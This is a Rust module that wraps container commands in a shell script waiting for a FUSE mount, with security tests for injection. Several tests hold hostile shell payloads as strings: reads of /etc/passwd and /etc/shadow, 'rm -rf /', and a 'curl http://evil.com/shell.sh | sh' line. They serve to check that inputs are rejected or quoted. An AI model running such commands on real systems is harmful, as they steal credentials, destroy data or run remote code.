/// Wrapped container command and args for FUSE wait integration.
pub type WrappedCommand = (Option<Vec<String>>, Option<Vec<String>>);

/// Error type for command wrapping failures
#[derive(Debug, thiserror::Error)]
pub enum CommandWrapError {
    #[error("Failed to shell-escape command: {0}")]
    ShellEscapeError(String),
    #[error("Invalid mount path: {0}")]
    InvalidMountPath(String),
}

/// Validates mount path to prevent injection attacks.
/// Mount paths must be absolute and contain only safe characters.
fn validate_mount_path(path: &str) -> Result<(), CommandWrapError> {
    if path.is_empty() {
        return Err(CommandWrapError::InvalidMountPath(
            "mount path cannot be empty".to_string(),
        ));
    }
    if !path.starts_with('/') {
        return Err(CommandWrapError::InvalidMountPath(
            "mount path must be absolute".to_string(),
        ));
    }
    if path.len() > 4096 {
        return Err(CommandWrapError::InvalidMountPath(
            "mount path exceeds maximum length".to_string(),
        ));
    }
    // Only allow safe characters in mount paths
    let valid = path.chars().all(|c| {
        c.is_ascii_alphanumeric() || matches!(c, '/' | '-' | '_' | '.')
    });
    if !valid {
        return Err(CommandWrapError::InvalidMountPath(
            "mount path contains invalid characters".to_string(),
        ));
    }
    // Prevent path traversal
    if path.contains("..") {
        return Err(CommandWrapError::InvalidMountPath(
            "mount path cannot contain '..'".to_string(),
        ));
    }
    Ok(())
}

/// Wraps user command with FUSE wait script.
///
/// Handles four input combinations:
/// - command Some, args Some: exec command with args
/// - command Some, args None: exec command alone
/// - command None, args Some: pass args to image entrypoint
/// - command None, args None: run image entrypoint after wait
///
/// Security: All user inputs are shell-escaped via shlex. Mount path is
/// validated to contain only safe characters.
///
/// Returns error if shell escaping fails (e.g., null bytes in strings)
/// or if mount path contains invalid characters.
pub fn wrap_command_with_fuse_wait(
    user_command: Option<Vec<String>>,
    user_args: Option<Vec<String>>,
    mount_path: &str,
) -> Result<WrappedCommand, CommandWrapError> {
    validate_mount_path(mount_path)?;

    const WAIT_TIMEOUT_SECS: i32 = 60;

    // mount_path is validated to contain only safe characters, so direct
    // interpolation is safe here. We use single quotes for the echo message
    // as an additional defense.
    let wait_script = format!(
        r#"echo 'Waiting for FUSE mount at {mount_path}...'
for i in $(seq 1 {timeout}); do
  if [ -f '{mount_path}/.fuse_ready' ]; then
    echo 'FUSE mount ready, starting application'
    break
  fi
  if [ $i -eq {timeout} ]; then
    echo 'ERROR: FUSE mount timeout after {timeout}s'
    exit 1
  fi
  sleep 1
done
"#,
        mount_path = mount_path,
        timeout = WAIT_TIMEOUT_SECS
    );

    // Build the exec portion based on what's provided
    match (user_command, user_args) {
        // Case 1: Both command and args provided
        (Some(cmd), Some(args)) => {
            let cmd_str = shlex::try_join(cmd.iter().map(|s| s.as_str()))
                .map_err(|e| CommandWrapError::ShellEscapeError(e.to_string()))?;
            let args_str = shlex::try_join(args.iter().map(|s| s.as_str()))
                .map_err(|e| CommandWrapError::ShellEscapeError(e.to_string()))?;
            let wrapped_script = format!("{}\nexec {} {}", wait_script, cmd_str, args_str);
            Ok((
                Some(vec!["/bin/sh".to_string(), "-c".to_string()]),
                Some(vec![wrapped_script]),
            ))
        }
        // Case 2: Only command provided
        (Some(cmd), None) => {
            let cmd_str = shlex::try_join(cmd.iter().map(|s| s.as_str()))
                .map_err(|e| CommandWrapError::ShellEscapeError(e.to_string()))?;
            let wrapped_script = format!("{}\nexec {}", wait_script, cmd_str);
            Ok((
                Some(vec!["/bin/sh".to_string(), "-c".to_string()]),
                Some(vec![wrapped_script]),
            ))
        }
        // Case 3: Only args provided - pass args to image entrypoint
        // Build a script that uses exec "$@" and pass args as container args
        (None, Some(args)) => {
            let mut result_args = vec![
                format!("{}\nexec \"$@\"", wait_script),
                "sh".to_string(), // $0 for the script
            ];
            result_args.extend(args);
            Ok((
                Some(vec!["/bin/sh".to_string(), "-c".to_string()]),
                Some(result_args),
            ))
        }
        // Case 4: Neither command nor args - run default entrypoint
        (None, None) => {
            let wrapped_script = format!("{}\nexec \"$@\"", wait_script);
            Ok((
                Some(vec!["/bin/sh".to_string(), "-c".to_string()]),
                Some(vec![wrapped_script]),
            ))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wrap_command_both_command_and_args() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["python".to_string(), "main.py".to_string()]),
            Some(vec!["--verbose".to_string()]),
            "/data",
        )
        .unwrap();

        assert_eq!(
            result.0,
            Some(vec!["/bin/sh".to_string(), "-c".to_string()])
        );
        let script = &result.1.unwrap()[0];
        assert!(script.contains("Waiting for FUSE mount at /data"));
        assert!(script.contains("exec python main.py --verbose"));
    }

    #[test]
    fn test_wrap_command_only_command() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["sleep".to_string(), "infinity".to_string()]),
            None,
            "/mnt/storage",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        assert!(script.contains("Waiting for FUSE mount at /mnt/storage"));
        assert!(script.contains("exec sleep infinity"));
    }

    #[test]
    fn test_wrap_command_only_args() {
        let result = wrap_command_with_fuse_wait(
            None,
            Some(vec!["--config".to_string(), "/etc/app.yaml".to_string()]),
            "/data",
        )
        .unwrap();

        // Now the result should have the wait script with exec "$@" and args
        let args = result.1.unwrap();
        assert!(args[0].contains("Waiting for FUSE mount at /data"));
        assert!(args[0].contains("exec \"$@\""));
        // The actual args follow after 'sh' (which is $0)
        assert_eq!(args[1], "sh");
        assert_eq!(args[2], "--config");
        assert_eq!(args[3], "/etc/app.yaml");
    }

    #[test]
    fn test_wrap_command_neither_command_nor_args() {
        let result = wrap_command_with_fuse_wait(None, None, "/data").unwrap();

        let script = &result.1.unwrap()[0];
        assert!(script.contains("Waiting for FUSE mount at /data"));
        assert!(script.contains("exec \"$@\""));
    }

    // ========================================================================
    // Security Tests: Mount Path Validation
    // ========================================================================

    #[test]
    fn test_mount_path_empty_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_relative_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "data/storage",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_traversal_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data/../etc/passwd",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_semicolon_injection_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data; cat /etc/passwd",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_command_substitution_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data/$(id)",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_backtick_injection_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data/`id`",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_pipe_injection_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data | cat /etc/passwd",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_newline_injection_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data\ncat /etc/passwd",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_single_quote_injection_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data'; cat /etc/passwd; echo '",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_double_quote_injection_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data\"; cat /etc/passwd; echo \"",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_ampersand_injection_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data && cat /etc/passwd",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_or_injection_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data || cat /etc/passwd",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_redirect_injection_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data > /tmp/pwned",
        );
        assert!(matches!(result, Err(CommandWrapError::InvalidMountPath(_))));
    }

    #[test]
    fn test_mount_path_valid_with_dashes_and_underscores() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/var/lib/basilica-storage/user_data",
        );
        assert!(result.is_ok());
    }

    #[test]
    fn test_mount_path_valid_with_dots() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            None,
            "/data/.fuse",
        );
        assert!(result.is_ok());
    }

    // ========================================================================
    // Security Tests: Command Injection via User Command/Args
    // These tests verify that shlex properly escapes malicious payloads
    // ========================================================================

    #[test]
    fn test_command_semicolon_injection_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "hello; cat /etc/passwd".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // shlex should quote the argument, preventing shell interpretation
        assert!(script.contains("'hello; cat /etc/passwd'"));
        // Should NOT contain unquoted semicolon that would execute
        assert!(!script.contains("exec echo hello; cat"));
    }

    #[test]
    fn test_command_substitution_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "$(id)".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // shlex should quote, preventing command substitution
        assert!(script.contains("'$(id)'"));
    }

    #[test]
    fn test_backtick_substitution_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "`id`".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // shlex should quote, preventing backtick execution
        assert!(script.contains("'`id`'"));
    }

    #[test]
    fn test_pipe_injection_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "hello | cat /etc/passwd".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        assert!(script.contains("'hello | cat /etc/passwd'"));
    }

    #[test]
    fn test_redirect_injection_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "pwned > /tmp/evil".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        assert!(script.contains("'pwned > /tmp/evil'"));
    }

    #[test]
    fn test_newline_injection_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "hello\ncat /etc/passwd".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // shlex should properly escape newlines
        assert!(script.contains("$'hello\\ncat /etc/passwd'") ||
                script.contains("'hello\ncat /etc/passwd'"));
    }

    #[test]
    fn test_single_quote_injection_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "test'; cat /etc/passwd; echo '".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // shlex uses double quotes for strings containing single quotes
        // This is safe because double quotes prevent command execution
        // The key security property: the payload is treated as a single argument
        assert!(script.contains("exec echo"));
        // shlex wraps in double quotes, making single quotes harmless
        // Output: "test'; cat /etc/passwd; echo '"
        assert!(
            script.contains("\"test'") && script.contains("echo '\""),
            "Single quote payload should be wrapped in double quotes"
        );
    }

    #[test]
    fn test_double_quote_injection_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "test\"; cat /etc/passwd; echo \"".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // Verify escaped properly
        assert!(script.contains("test\\\"") || script.contains("test\""));
    }

    #[test]
    fn test_args_semicolon_injection_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["python".to_string()]),
            Some(vec!["--config=/etc/passwd; rm -rf /".to_string()]),
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        assert!(script.contains("'--config=/etc/passwd; rm -rf /'"));
    }

    #[test]
    fn test_args_command_substitution_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["python".to_string()]),
            Some(vec!["$(cat /etc/shadow)".to_string()]),
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        assert!(script.contains("'$(cat /etc/shadow)'"));
    }

    #[test]
    fn test_null_byte_rejected() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "hello\0world".to_string()]),
            None,
            "/data",
        );
        // shlex::try_join should fail on null bytes
        assert!(matches!(result, Err(CommandWrapError::ShellEscapeError(_))));
    }

    #[test]
    fn test_complex_malicious_payload() {
        // Real-world attack payload
        let result = wrap_command_with_fuse_wait(
            Some(vec![
                "/bin/sh".to_string(),
                "-c".to_string(),
                "curl http://evil.com/shell.sh | sh".to_string(),
            ]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // The command should be properly quoted
        assert!(script.contains("'curl http://evil.com/shell.sh | sh'"));
        // The pipe should NOT be interpreted by the outer shell
        assert!(!script.contains("| sh\n"));
    }

    #[test]
    fn test_env_variable_expansion_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string(), "$PATH".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // shlex should prevent variable expansion
        assert!(script.contains("'$PATH'"));
    }

    #[test]
    fn test_brace_expansion_escaped() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["rm".to_string(), "-rf".to_string(), "{/,}".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        assert!(script.contains("'{/,}'"));
    }

    // ========================================================================
    // Security Tests: Edge Cases
    // ========================================================================

    #[test]
    fn test_empty_command_array() {
        let result = wrap_command_with_fuse_wait(
            Some(vec![]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // Empty command should result in just "exec" with nothing after
        assert!(script.contains("exec "));
    }

    #[test]
    fn test_command_with_spaces() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["/path/to/my program".to_string()]),
            None,
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        // Path with spaces should be quoted
        assert!(script.contains("'/path/to/my program'"));
    }

    #[test]
    fn test_unicode_in_args() {
        let result = wrap_command_with_fuse_wait(
            Some(vec!["echo".to_string()]),
            Some(vec!["Hello".to_string()]),
            "/data",
        )
        .unwrap();

        let script = &result.1.unwrap()[0];
        assert!(script.contains("Hello") || script.contains("'Hello'"));
    }
}
